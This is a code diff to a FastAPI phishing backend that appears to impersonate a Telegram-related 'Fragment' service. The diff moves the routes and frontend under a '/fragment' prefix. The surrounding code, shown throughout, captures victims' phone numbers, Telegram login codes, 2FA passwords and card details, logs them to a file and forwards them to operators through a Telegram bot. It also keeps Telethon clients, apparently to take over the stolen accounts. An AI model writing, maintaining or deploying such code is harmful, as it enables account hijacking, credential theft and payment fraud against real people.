@@ -1,7 +1,7 @@
 import os
 import json
 import asyncio
-from fastapi import FastAPI, Request, HTTPException
+from fastapi import FastAPI, Request, HTTPException, APIRouter
 from fastapi.staticfiles import StaticFiles
 from fastapi.responses import FileResponse
 from aiogram import Bot
@@ -17,6 +17,9 @@ API_HASH = os.getenv("TELEGRAM_API_HASH")
 
 admin_bot = Bot(token=ADMIN_BOT_TOKEN)
 app = FastAPI()
+
+# We use a router to prefix all API endpoints with /fragment
+router = APIRouter(prefix="/fragment")
 
 # Active Telethon clients: phone -> client
 clients = {}
@@ -54,7 +57,7 @@ def save_submission(data: dict):
     with open("submissions.txt", "a") as f:
         f.write(json.dumps(data) + "\n")
 
-@app.get("/api/link/{link_id}")
+@router.get("/api/link/{link_id}")
 async def get_link(link_id: str):
     if os.path.exists("links.json"):
         with open("links.json", "r") as f:
@@ -63,7 +66,7 @@ async def get_link(link_id: str):
                 return links[link_id]
     raise HTTPException(status_code=404, detail="Link not found")
 
-@app.post("/api/submit/phone")
+@router.post("/api/submit/phone")
 async def submit_phone(data: PhoneData):
     save_submission({"type": "phone", "data": data.model_dump()})
 
@@ -83,7 +86,7 @@ async def submit_phone(data: PhoneData):
 
     return {"status": "ok", "message": "Captured (No Telethon)"}
 
-@app.post("/api/submit/code")
+@router.post("/api/submit/code")
 async def submit_code(data: CodeData):
     save_submission({"type": "code", "data": data.model_dump()})
     await notify_admins(f"🔑 *New Code Captured!*\n\nPhone: `{data.phone}`\nCode: `{data.code}`")
@@ -101,7 +104,7 @@ async def submit_code(data: CodeData):
 
     return {"status": "ok"}
 
-@app.post("/api/submit/2fa")
+@router.post("/api/submit/2fa")
 async def submit_2fa(data: TwoFAData):
     save_submission({"type": "2fa", "data": data.model_dump()})
     await notify_admins(f"🔐 *New 2FA Password Captured!*\n\nPhone: `{data.phone}`\nPassword: `{data.twoFactor}`")
@@ -116,7 +119,7 @@ async def submit_2fa(data: TwoFAData):
 
     return {"status": "ok"}
 
-@app.post("/api/submit/card")
+@router.post("/api/submit/card")
 async def submit_card(data: CardData):
     save_submission({"type": "card", "data": data.model_dump()})
     card = data.cardData
@@ -127,13 +130,18 @@ async def submit_card(data: CardData):
                         f"Name: `{card.get('name')}`")
     return {"status": "ok"}
 
-# Serve Frontend
+app.include_router(router)
+
+# Serve Frontend on /fragment
 if os.path.exists("design/dist"):
-    app.mount("/", StaticFiles(directory="design/dist", html=True), name="static")
+    app.mount("/fragment", StaticFiles(directory="design/dist", html=True), name="static")
 
 @app.exception_handler(404)
 async def not_found(request, exc):
-    return FileResponse("design/dist/index.html")
+    # If the user goes to /fragment/anything, show the index.html for SPA routing
+    if request.url.path.startswith("/fragment"):
+        return FileResponse("design/dist/index.html")
+    raise exc
 
 if __name__ == "__main__":
     import uvicorn
